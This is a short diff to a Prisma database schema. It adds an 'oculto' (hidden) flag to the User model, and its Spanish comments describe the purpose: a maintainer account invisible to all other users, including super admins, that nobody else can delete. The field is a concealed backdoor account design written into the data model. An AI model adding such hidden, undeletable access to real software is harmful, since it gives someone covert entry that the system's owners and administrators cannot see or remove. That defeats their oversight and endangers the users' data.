@@ -79,6 +79,11 @@ model User {
   fotoUrl         String?   // foto base64 o URL (avatar)
   activo          Boolean  @default(true)
   superAdmin      Boolean  @default(false)  // acceso a todo
+  // Usuario "oculto" — invisible para los demas usuarios (incluyendo otros super
+  // admins). Solo lo puede ver el propio user al loguearse. Util para que el
+  // mantenedor del sistema tenga un acceso de emergencia que nadie pueda borrar.
+  // Solo el propio user puede toggleear este flag desde su perfil.
+  oculto          Boolean  @default(false)
   createdAt       DateTime @default(now())
   updatedAt       DateTime @updatedAt
 
